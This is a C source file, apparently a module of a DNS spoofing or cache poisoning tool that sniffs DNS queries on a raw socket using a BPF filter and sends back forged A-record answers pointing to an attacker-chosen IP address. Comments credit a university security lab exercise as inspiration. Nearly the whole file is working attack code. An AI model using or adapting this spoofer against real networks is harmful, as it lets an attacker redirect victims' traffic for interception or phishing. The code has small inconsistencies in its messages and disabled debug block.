#ifndef _DEFAULT_SOURCE
#define _DEFAULT_SOURCE
#endif

#include <arpa/inet.h>
#include <errno.h>
#include <limits.h>
#include <linux/filter.h>
#include <linux/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <netdb.h>
#include <netinet/ether.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <pthread.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/param.h>
#include <sys/raw.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#include "filter.h"
#include "poison.h"

//generate the filter code with the following
//  sudo tcpdump -dd "udp dst port 53"
static struct sock_filter rawsock_filter[] = {{0x28, 0, 0, 0x0000000c}, {0x15, 0, 4, 0x000086dd},
    {0x30, 0, 0, 0x00000014}, {0x15, 0, 11, 0x00000011}, {0x28, 0, 0, 0x00000038},
    {0x15, 8, 9, 0x00000035}, {0x15, 0, 8, 0x00000800}, {0x30, 0, 0, 0x00000017},
    {0x15, 0, 6, 0x00000011}, {0x28, 0, 0, 0x00000014}, {0x45, 4, 0, 0x00001fff},
    {0xb1, 0, 0, 0x0000000e}, {0x48, 0, 0, 0x00000010}, {0x15, 0, 1, 0x00000035},
    {0x6, 0, 0, 0x00040000}, {0x6, 0, 0, 0x00000000}};

static struct sock_fprog udp_prog
    = {.len = sizeof(rawsock_filter) / sizeof(rawsock_filter[0]), .filter = rawsock_filter};

//inspired by: http://minirighi.sourceforge.net/html/ip_8c-source.html
inline uint16_t csum(const uint16_t* buf, int nwords) {
    uint64_t sum = 0;
    const uint16_t* ip1;

    ip1 = buf;
    while (nwords > 1) {
        sum += *ip1++;
        if (sum & 0x80000000) {
            sum = (sum & 0xFFFF) + (sum >> 16);
        }
        nwords -= 2;
    }

    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }

    return ~sum;
}

//inspired by: http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/DNS_Remote/udp.c
inline uint32_t checksum(const uint16_t* buf, int size) {
    uint32_t cksum = 0;

    for (; size > 1; size -= 2) {
        cksum += *buf++;
    }

    if (size == 1) {
        cksum += *(uint16_t*)buf;
    }

    return cksum;
}

//inspired by http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/DNS_Remote/udp.c
//also from john, thanks john
inline uint16_t check_udp_sum(const uint8_t* buf, int len) {
    const struct iphdr* tempI  = (const struct iphdr*)(buf);
    const struct udphdr* tempH = (const struct udphdr*)(buf + sizeof(struct iphdr));

    uint64_t sum;
    sum = checksum((uint16_t*)&(tempI->saddr), 8);
    sum += checksum((uint16_t*)tempH, len);
    sum += ntohs(IPPROTO_UDP + len);
    sum = (sum >> 16) + (sum & 0x0000ffff);
    sum += (sum >> 16);

    return (uint16_t)(~sum);
}

int set_filter(int sock) {
    if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &udp_prog, sizeof(struct sock_fprog))
        == -1) {
        perror("setsockopt");
        return -1;
    }
    return 0;
}

void* intercept(void* targets) {
    static uint8_t buffer[4096];
    struct ether_header* ehdr = (struct ether_header*)buffer;
    struct iphdr* ihdr        = (struct iphdr*)(ehdr + 1);
    struct udphdr* uhdr       = (struct udphdr*)(ihdr + 1);
    struct dnshdr* dhdr       = (struct dnshdr*)(uhdr + 1);

    int nread;
    //copy it local
    targets_t t = *(targets_t*)targets;

    static struct sockaddr_ll addr = {0};

    addr.sll_family   = AF_PACKET;
    addr.sll_ifindex  = t.ifindex;
    addr.sll_halen    = ETHER_ADDR_LEN;
    addr.sll_protocol = htons(ETH_P_ARP);
    memcpy(addr.sll_addr, t.cmac, ETHER_ADDR_LEN);

    set_filter(t.sock);

    while ((nread = read(t.sock, buffer, 4096)) != -1) {
        //size + 2 for class + 2 for type + 6 for smallest possible domain (ti.ny)
        if (__builtin_expect(
                (unsigned long)nread < (sizeof(struct ether_header) + sizeof(struct iphdr)
                                           + sizeof(struct udphdr) + sizeof(struct dnshdr) + 10),
                0)) {
            //must be malformed, its smaller than the header
            continue;
        }

        if (__builtin_expect(ntohs(dhdr->q_count) > 1, 0)) {
            fputs("only single queries supported, skipping\n", stderr);
            continue;
        }

        //name is total length - 2 shorts at the end from the name offset for class and type
        uint16_t dclass = ntohs(*(uint16_t*)(buffer + nread - 4)); //after name is class
        uint16_t dtype  = ntohs(*(uint16_t*)(buffer + nread - 2)); //after class is type
        uint8_t* offset = (uint8_t*)(buffer + nread);

        if (__builtin_expect(dclass != 1, 0)) {
            fputs("only A records supported, skipping\n", stderr);
            continue;
        }

        if (__builtin_expect(dtype != 1, 0)) {
            fputs("only IN types supported, skipping\n", stderr);
            continue;
        }

        //swap the macs
        static uint8_t mac[6];
        memcpy(mac, ehdr->ether_dhost, 6);
        memcpy(ehdr->ether_dhost, ehdr->ether_shost, 6);
        memcpy(ehdr->ether_shost, mac, 6);

        //swap the ips
        uint32_t ip = ihdr->daddr;
        ihdr->daddr = ihdr->saddr;
        ihdr->saddr = ip;

        //could inc it, doesnt matter
        //ihdr->id = htons(ntohs(ihdr->id) + 1);

        //swap the ports
        uhdr->dest   = uhdr->source;
        uhdr->source = htons(53); //constant is faster than a copy

        //set the flags to the magic numbers for default responses
        ((uint8_t*)dhdr)[2] = 0x81;
        ((uint8_t*)dhdr)[3] = 0x80;

        dhdr->ans_count = htons(1); //constant is faster than a copy

        //compressed
        offset[0] = 0xc0;
        //12 offset
        offset[1] = 0x0c;
        //class
        offset[2] = 0x00;
        offset[3] = 0x01;
        //type
        offset[4] = 0x00;
        offset[5] = 0x01;
        //ttl 180
        offset[6] = 0x00;
        offset[7] = 0x00;
        offset[8] = 0x00;
        offset[9] = 0xb4;

        offset[10] = 0x00;
        offset[11] = 0x04;

        uint32_t* iptr = (uint32_t*)(offset + 12);
        *iptr          = t.dip;

        //12 bytes of default request data and 4 bytes of ip
        nread += 16;

        ihdr->tot_len = htons(ntohs(ihdr->tot_len) + 16);
        uhdr->len = htons(ntohs(uhdr->len) + 16);


        //recalc ip checksum
        ihdr->check = 0;
        ihdr->check = csum((const uint16_t*)ihdr, sizeof(struct iphdr));

        //recalc udp checksum
        uhdr->check = 0;
        uhdr->check = check_udp_sum((uint8_t*)ihdr, ntohs(uhdr->len));

        if (sendto(t.sock, buffer, nread, 0, (struct sockaddr*)&addr, sizeof(struct sockaddr_ll))
            == -1) {
            perror("sendto");
            break;
        }
#if 0
        //for if you want to know the details
        printf("id:     %hX\n", ntohs(dhdr->id));
        printf("rec:    %c\n", dhdr->rd ? 'y' : 'n');
        printf("truc:   %c\n", dhdr->tc ? 'y' : 'n');
        printf("auth:   %c\n", dhdr->aa ? 'y' : 'n');
        printf("op:     %d\n", dhdr->opcode);
        printf("qr:     %c\n", dhdr->qr ? 'y' : 'n');
        printf("rcode:  %d\n", dhdr->rcode);
        printf("check:  %c\n", dhdr->cd ? 'y' : 'n');
        printf("auth2:  %c\n", dhdr->ad ? 'y' : 'n');
        printf("z?:     %c\n", dhdr->z ? 'y' : 'n');
        printf("reca:   %c\n", dhdr->ra ? 'y' : 'n');
        printf("qcount: %hX\n", ntohs(dhdr->q_count));
        printf("ans:    %hX\n", ntohs(dhdr->ans_count));
        printf("auth:   %hX\n", ntohs(dhdr->auth_count));
        printf("add:    %hX\n", ntohs(dhdr->add_count));
        printf("name:   %s\n", name + 1);
        printf("class:  %u\n", dclass);
        printf("type:   %u\n", dtype);
#endif
    }

    perror("read");
    return NULL;
}
